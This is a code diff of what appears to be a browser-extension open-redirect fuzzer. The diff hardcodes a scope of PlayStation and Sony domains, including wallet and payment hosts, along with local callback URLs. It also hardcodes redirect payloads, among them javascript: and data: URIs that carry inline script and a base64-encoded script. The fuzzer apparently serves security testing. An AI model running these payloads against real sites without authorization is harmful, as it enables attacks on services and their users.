@@ -4,7 +4,47 @@
 
 "use strict";
 
-let sessionConfig = {};
+let bufferLengthURLs = 80;
+let callbackURLOpenRedirectTimestamps = "http://0.0.0.0:4242";
+let callbackURLRequestTimestamps = "http://0.0.0.0:4243";
+let delayThrottleAutoScrollNode = 10;
+let delayThrottleRegexpSearch = 10;
+let delayThrottleURLIndexing = 10;
+let redirectURLs = [
+  "https://runescape.com",
+  "https://runescape.com/",
+  "https://runescape.com/splash",
+  "https://runescape.com/splash?ing",
+  "http://runescape.com",
+  "http://runescape.com/",
+  "http://runescape.com/splash",
+  "http://runescape.com/splash?ing",
+  "//runescape.com",
+  "//runescape.com/",
+  "//runescape.com/splash",
+  "//runescape.com/splash?ing",
+  "runescape.com",
+  "runescape.com/",
+  "runescape.com/splash",
+  "runescape.com/splash?ing",
+  "data:text/html,<script>location='https://runescape.com'</script>",
+  "data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0naHR0cHM6Ly9ydW5lc2NhcGUuY29tJzwvc2NyaXB0Pg",
+  "javascript:location='https://runescape.com'",
+  "javascript:location='//runescape.com'",
+];
+let scanOutOfScopeOrigins = false;
+let scope = [
+  "*://*.playstation.net",
+  "*://*.sonyentertainmentnetwork.com",
+  "*://*.api.playstation.com",
+  "*://my.playstation.com",
+  "*://store.playstation.com",
+  "*://social.playstation.com",
+  "*://transact.playstation.com",
+  "*://wallets.playstation.com",
+  "*://direct.playstation.com",
+  "*://api.direct.playstation.com",
+];
 
 const consoleCSS = "background-color:rgb(80,255,0);text-shadow:0 1px 1px rgba(0,0,0,.3);color:black";
 const regexpSelectorAllHTMLAttributes = / [a-z-]+[=]["'][^"']+["']/ig;
@@ -27,7 +67,7 @@ const regexpSelectorURLPort = /^([:](?:6553[0-5]|655[0-2][0-9]|65[0-4][0-9][0-9]
 const regexpSelectorURLProtocol = /^((?:[a-z0-9.+-]{1,256}[:])(?:[/][/])?|(?:[a-z0-9.+-]{1,256}[:])?[/][/])?.*$/i;
 const regexpSelectorURLScheme = /^([a-z0-9.+-]*)[*]([a-z0-9.+-]*):/ig;
 const regexpSelectorURLSearch = /^([?][^#]{0,2048})?.*$/i;
-const regexpSelectorWildcard = /[*]/g;
+const regexpSelectorWildCard = /[*]/g;
 
 let injectableParameterURLs = [];
 let scannableURLs = [];
@@ -338,12 +378,12 @@ const parseURL = url => {
  * (example output given "\*://\*.in.scope.*" is in the scope: true)
  */
 const isInScopeOrigin = origin => {
-  for (let a = 0; a < sessionConfig.scope.length; a++) {
+  for (let a = 0; a < scope.length; a++) {
     const regexpInScopeOrigin = new RegExp(
-      "^" + sessionConfig.scope[a]
+      "^" + scope[a]
         .replace(regexpSelectorEscapeChars, "[$1]") /* escape chars */
         .replace(regexpSelectorURLScheme, "$1[a-z0-9.+-]+$2:") /* scheme */
-        .replace(regexpSelectorWildcard, "(?:(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)"), /* host wildcard */
+        .replace(regexpSelectorWildCard, "(?:(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)"), /* host wildcard */
       "ig");
     if (regexpInScopeOrigin.test(origin)) {
       return true;
@@ -396,17 +436,6 @@ const toFullURL = uri => {
  */
 const trimWhitespaces = str => {
   return str.replace(/^\s*(.*)\s*$/g, "$1");
-};
-
-/**
- * Registers message listener.
- */
-const registerMessageListener = async () => {
-  chrome.runtime.onMessage.addListener(message => {
-    if (message.sessionConfig) {
-      sessionConfig = message.sessionConfig;
-    }
-  });
 };
 
 /**
@@ -663,12 +692,11 @@ console.log("completed scanForURIs()")
  * Init fuzzer.
  */
 (async () => {
-  registerMessageListener();
-  startAutoScrolling();
   /* If successfully exploited, send a timestamped callback for open redirects. */
+  startAutoScrolling();
   let redirectHosts = [];
-  for (let a = 0; a < sessionConfig.redirectURLs.length; a++) {
-    const parsedURL = parseURL(sessionConfig.redirectURLs[a]);
+  for (let a = 0; a < redirectURLs.length; a++) {
+    const parsedURL = parseURL(redirectURLs[a]);
     const protocol = parsedURL[0].toLowerCase();
     if (
          parsedURL[1].length !== 0
